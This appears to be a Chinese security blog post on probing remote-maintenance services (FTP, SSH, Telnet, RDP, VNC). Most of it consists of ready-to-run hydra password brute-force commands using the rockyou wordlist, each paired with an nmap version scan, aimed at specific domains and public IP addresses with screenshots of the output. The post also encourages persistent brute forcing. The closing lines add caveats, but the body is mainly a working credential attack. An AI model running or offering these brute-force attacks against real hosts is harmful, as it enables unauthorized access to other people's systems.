ailx10说：这篇是我2023年6月写的。远程维护服务这一章，FTP、SSH、Telnet、RDP、VNC 都是平时经常听见的名字，我就按发现版本、确认入口、观察认证的顺序整理。它们的共同点很直观：本来就是给人远程做事用的，配置和凭据自然就站在门口。文章留下那些工具命令，是为了把一个端口背后的服务轮廓认出来。读到这里，前面网络扫描和信息收集的碎片又能接上，知道地址可达只是起点，还得继续看它究竟开放了哪一种工作方式。

---

![](/notes-assets/ff4cd92cb2e9b093ca0f.webp)

先进行指纹识别，如果版本比较低有漏洞，那么就走漏洞利用，如果没有漏洞，那么就走暴力破解，坚持10年，脚本小子，总能成为安全大神。

1、ftp口令暴力破解

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://www.voia.top
```

![](/notes-assets/b364f8ce92a5be3654d4.webp)

2、ftp指纹识别

```
nmap -Pn -sV www.voia.top -p 21
```

![](/notes-assets/65d381a81344c64f2751.webp)

3、ssh暴力破解

```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://jgka.xyz
```

![](/notes-assets/c14e11b3ca2641c8e1f6.webp)

4、ssh指纹识别

```
nmap -Pn -sV jgka.xyz -p 22
```

![](/notes-assets/115b405b0113f2b1e6eb.webp)

5、telnet暴力破解

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://60.167.80.36
```

![](/notes-assets/db55753e3ed793dcec85.webp)

6、telnet指纹识别

```
nmap -Pn -sV 60.167.80.36 -p 23
```

![](/notes-assets/2b23e6dae0781e02b88e.webp)

7、rdp暴力破解

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://81.68.64.86
```

![](/notes-assets/ed99cc9d1e543a133ac0.webp)

8、rdp指纹识别

```
nmap -Pn -sV 81.68.64.86 -p 3389
```

![](/notes-assets/3ae1be4c4df0a9ca9e73.webp)

9、vnc暴力破解

```
hydra -P /usr/share/wordlists/rockyou.txt vnc://58.18.139.84:5901 -t 1
```

![](/notes-assets/52076f62bcee96cdbda9.webp)

10、vnc指纹识别

```
nmap -Pn -sV 58.18.139.84 -p 5901
```

![](/notes-assets/58f8af2f3a238599ad13.webp)

版本低不直接等于可利用，命令列出来也不说明猜测已经成功。保留具体响应和权限条件，才能让服务评估从工具输出走向可以处理的风险。
